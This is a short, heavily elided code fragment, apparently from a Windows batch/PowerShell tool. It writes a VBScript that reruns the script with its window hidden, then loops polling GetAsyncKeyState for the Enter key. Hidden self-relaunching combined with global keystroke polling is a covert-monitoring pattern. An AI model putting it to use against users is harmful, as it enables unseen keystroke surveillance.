...
ECHO CreateObject("Wscript.Shell").Run "" ^& " %~0", vbHide, False > "!SY_APPCONFIGPATH!\enterdetect.vbs"
...
function main
{
	...
	"Wall-E" | Out-File -FilePath $FilePath -Encoding utf8
	...
	while ($true) {
		...
		if ([User32]::GetAsyncKeyState(0x0D) -band 0x8000) {
